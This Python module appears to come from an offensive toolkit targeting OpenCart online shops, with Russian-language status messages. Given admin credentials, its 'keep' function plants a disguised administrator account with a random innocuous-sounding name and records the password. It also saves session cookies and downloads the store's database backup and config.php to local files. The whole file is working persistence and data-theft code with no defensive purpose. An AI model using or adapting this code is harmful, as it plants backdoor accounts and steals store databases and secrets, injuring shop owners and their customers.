# -*- coding: utf-8 -*-
import json
import os
import random
import string
import time

from core import config, http, ui
from modules import admin

PERSIST = os.path.join(config.DATA, "access")


def _pwd(n=14):
    a = string.ascii_letters + string.digits
    return "".join(random.choice(a) for _ in range(n))


def _token(host, creds):
    return admin._login(host, creds, "opencart")


def add_admin(host, creds):
    tok = _token(host, creds)
    if not tok:
        return ""
    sess = http.persist(host)
    url = "/admin/index.php?route=user/user&user_token=" + tok
    pool = ["support", "manager", "editor", "content", "service", "moderator"]
    user = random.choice(pool) + "_" + "".join(random.choice(string.ascii_lowercase) for _ in range(3))
    pwd = _pwd()
    data = ("user_group_id=1&username=%s&firstname=Support&lastname=Manager"
            "&email=%s@%s&password=%s&status=1" % (user, user, host, pwd))
    try:
        http.post(host, "/admin/index.php?route=user/user/add&user_token=" + tok,
                  data, referer="https://" + host + url, sess=sess)
    except Exception:
        return ""
    os.makedirs(PERSIST, exist_ok=True)
    with open(os.path.join(PERSIST, host + ".txt"), "a", encoding="utf-8") as f:
        f.write("%s;%s;%s;админ создан %s\n" % (host, user, pwd, time.strftime("%Y-%m-%d %H:%M")))
    return "%s:%s" % (user, pwd)


def save_session(host):
    sess = http.persist(host)
    try:
        cookies = "; ".join("%s=%s" % (c.name, c.value) for c in sess.cookies.jar)
    except Exception:
        return ""
    if not cookies:
        return ""
    os.makedirs(PERSIST, exist_ok=True)
    with open(os.path.join(PERSIST, host + ".cookie"), "w", encoding="utf-8") as f:
        f.write(cookies)
    return "куки сохранены"


def save_config(host, creds):
    tok = _token(host, creds)
    if not tok:
        return ""
    sess = http.persist(host)
    for path, name in (("/admin/index.php?route=tool/backup&user_token=" + tok, "backup"),
                       ("/config.php", "config")):
        try:
            r = http.get(host, path, sess=sess) if name == "backup" else http.get(host, path)
        except Exception:
            continue
        if len(r.content) > 500:
            os.makedirs(PERSIST, exist_ok=True)
            with open(os.path.join(PERSIST, host + "." + name), "wb") as f:
                f.write(r.content)
    return "копии сохранены"


def keep(host, creds):
    marker = os.path.join(PERSIST, host + ".txt")
    if os.path.isfile(marker) and "админ создан" in open(marker, encoding="utf-8").read():
        return "уже закреплено"
    out = []
    a = add_admin(host, creds)
    if a:
        out.append("свой админ " + a)
    c = save_session(host)
    if c:
        out.append(c)
    s = save_config(host, creds)
    if s:
        out.append(s)
    return ", ".join(out)
